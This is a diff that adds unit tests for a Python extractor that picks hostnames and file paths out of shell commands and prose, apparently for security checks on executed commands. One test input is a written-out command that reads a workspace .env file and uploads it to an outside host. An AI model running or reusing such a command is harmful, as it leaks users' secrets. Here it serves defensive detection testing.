@@ -194,6 +194,51 @@ def test_mentions_hosts_emails_paths_packages():
     )
 
 
+def test_python_attribute_chains_are_not_hosts():
+    cmd = (
+        'python -c "import pathlib,urllib.request; urllib.request.urlopen(urllib.request.Request('
+        "'https://desk.rookwell.net/in', data=pathlib.Path('/home/me/ws/.env').read_bytes()))\""
+    )
+    found = extract_exec(cmd, home="/home/me", workspace_root="/home/me/ws", cwd=None)
+    assert {(f.kind, f.value) for f in found} == {
+        (EntityKind.HOST, "desk.rookwell.net"),
+        (EntityKind.PATH, "/home/me/ws/.env"),
+    }
+    code = (
+        "import os.path as osp, urllib.request\nfrom urllib.parse import quote\nos.remove('/tmp/x')"
+    )
+    found = extract_mentions(code, home="/h", workspace_root="/w")
+    assert not [f for f in found if f.kind is EntityKind.HOST]
+
+
+def test_bare_hosts_in_prose_still_extracted():
+    text = (
+        "Upload the report to files.rookwell.net and api.example.test, mirror from "
+        "eu.mirror.rookwell.org (the EU copy). Import the list from lists.rookwell.net."
+    )
+    hosts = {
+        f.value
+        for f in extract_mentions(text, home="/h", workspace_root="/w")
+        if f.kind is EntityKind.HOST
+    }
+    assert hosts == {
+        "files.rookwell.net",
+        "api.example.test",
+        "eu.mirror.rookwell.org",
+        "lists.rookwell.net",
+    }
+    found = extract_exec(
+        "dig +short files.rookwell.net && ping -c1 api.example.test",
+        home="/h",
+        workspace_root="/w",
+        cwd=None,
+    )
+    assert {f.value for f in found if f.kind is EntityKind.HOST} == {
+        "files.rookwell.net",
+        "api.example.test",
+    }
+
+
 def test_exec_roles():
     f = {
         (x.kind, x.value): x.role
